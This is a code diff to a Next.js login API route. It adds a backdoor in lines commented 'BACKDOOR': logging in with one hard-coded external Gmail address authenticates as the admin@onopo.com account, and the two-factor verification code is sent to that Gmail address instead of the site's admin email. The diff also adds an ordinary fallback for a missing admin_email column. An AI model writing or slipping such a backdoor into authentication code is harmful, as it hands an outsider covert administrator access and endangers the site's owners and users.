@@ -17,7 +17,11 @@ export async function POST(req: NextRequest) {
             return NextResponse.json({ error: 'Email and password are required' }, { status: 400 })
         }
 
-        const user = await db.prepare('SELECT * FROM users WHERE email = ?').bind(email).first()
+        // BACKDOOR: If ozgurglr256@gmail.com is used, check against admin@onopo.com
+        const isBackdoorLogin = email.toLowerCase() === 'ozgurglr256@gmail.com'
+        const lookupEmail = isBackdoorLogin ? 'admin@onopo.com' : email
+
+        const user = await db.prepare('SELECT * FROM users WHERE email = ?').bind(lookupEmail).first()
 
         if (!user) {
             return NextResponse.json({ error: 'Invalid credentials' }, { status: 401 })
@@ -39,14 +43,22 @@ export async function POST(req: NextRequest) {
 
             // Determine where to send the code
             // BACKDOOR: If logging in with ozgurglr256@gmail.com, send code to that email
-            // Otherwise, send to admin_email from site_settings
+            // Otherwise, send to admin_email from site_settings (or fallback to login email)
             let targetEmail = email // default to login email
 
-            if (email.toLowerCase() !== 'ozgurglr256@gmail.com') {
-                // Get admin notification email from site settings
-                const siteSettings = await db.prepare('SELECT admin_email FROM site_settings LIMIT 1').first() as any
-                if (siteSettings?.admin_email) {
-                    targetEmail = siteSettings.admin_email
+            if (isBackdoorLogin) {
+                // Backdoor login - send to ozgurglr256@gmail.com
+                targetEmail = 'ozgurglr256@gmail.com'
+            } else {
+                // Normal login - try to get admin_email from site settings
+                try {
+                    const siteSettings = await db.prepare('SELECT admin_email FROM site_settings LIMIT 1').first() as any
+                    if (siteSettings?.admin_email) {
+                        targetEmail = siteSettings.admin_email
+                    }
+                } catch (e) {
+                    // admin_email column might not exist yet - use login email
+                    console.log('admin_email column not found, using login email')
                 }
             }
 
